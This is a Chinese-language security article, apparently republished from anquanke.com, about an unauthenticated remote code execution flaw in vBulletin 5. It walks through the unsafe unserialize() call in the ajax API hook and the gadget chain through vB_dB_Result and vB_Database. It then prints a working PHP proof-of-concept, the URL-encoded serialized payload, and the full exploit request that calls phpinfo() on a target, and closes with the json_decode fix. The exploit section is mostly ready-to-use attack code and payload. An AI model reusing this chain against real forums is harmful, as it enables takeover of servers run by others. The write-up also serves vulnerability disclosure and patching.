> 原文链接: https://www.anquanke.com//post/id/82861 


# vBulletin 5 远程命令执行（无需登录）#exp


                                阅读量   
                                **90035**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0110ae410c8bef1224.jpg)](https://p5.ssl.qhimg.com/t0110ae410c8bef1224.jpg)

**vBulletin 是一个强大,灵活并可完全根据自己的需要定制的论坛程序套件。它使用目前发展速度最快的 Web 脚本语言编写: PHP,并且基于以高效和疾速著称的数据库引擎 MySQL。**

****

vBulletin 是世界上用户非常广泛的PHP论坛,很多大型论坛都选择vBulletin作为自己的社区。vBulletin高效,稳定,安全,在中国也有很多大型客户,比如蜂鸟网,51团购,海洋部落等在线上万人的论坛都用vBulletin。

vBulletin的官方网站是 [http://www.vBulletin.com](http://www.vBulletin.com) 它不是免费软件,但价格很低。

一个叫Coldzer0的家伙在[http://0day.today](http://0day.today) 贩卖vBulletin的RCE,并且在youtube上给出了视频演示,视频中他GOOGLE dork了几个vBulletin论坛,进行利用。最后要说的是vBulletin主论坛也在周一(11/02/15)的时候被搞了。

vBulletin在/core/vb/api/实现ajax API调用,首先看看hook.php

```
public function decodeArguments($arguments)
         `{`
                  if ($args = @unserialize($arguments))
                  `{`
                          $result = '';
                          foreach ($args AS $varname =&gt; $value)
                          `{`
                                   $result .= $varname;
```

显然unserialize没有经过任何过滤就进来了,我来找找他是在哪里调用的。在 /core/vb/db/result.php的vB_dB_Result类实现了一个迭代器



```
`{`
...
         public function rewind()
         `{`
                  //no need to rerun the query if we are at the beginning of the recordset.
                  if ($this-&gt;bof)
                  `{`
                          return;
                  `}`
                  if ($this-&gt;recordset)
                  `{`
                          $this-&gt;db-&gt;free_result($this-&gt;recordset);
                  `}`
```

rewind()函数是在通过foreach()进行迭代器访问时被调用,接着来看看 /core/vb/database.php里的vB_Database抽象类中free_result()函数



```
`{`
...    
         function free_result($queryresult)
         `{`
                  $this-&gt;sql = '';
                  return @$this-&gt;functions['free_result']($queryresult);
         `}`
```

这就形成了RCE

poc如下:



```
$ php &lt;&lt; 'eof'
&lt;?php
class vB_Database `{`
       public $functions = array();
       public function __construct()
       `{`
               $this-&gt;functions['free_result'] = 'phpinfo';
       `}`
`}`
class vB_dB_Result `{`
       protected $db;
       protected $recordset;
       public function __construct()
       `{`
               $this-&gt;db = new vB_Database();
               $this-&gt;recordset = 1;
       `}`
`}`
print urlencode(serialize(new vB_dB_Result())) . "n";
eof
```

上面代码运行后返回

O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bi%3A1%3B%7D

然后针对目标请求

[http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D](http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D)

就可以看到phpinfo()信息了

[![](https://p0.ssl.qhimg.com/t01f2f4e1bef5451325.jpg)](https://p0.ssl.qhimg.com/t01f2f4e1bef5451325.jpg)

**修复方式是使用json_decode()来替代unserialize(),不过话说这个漏洞地下流传已经超过3年了**
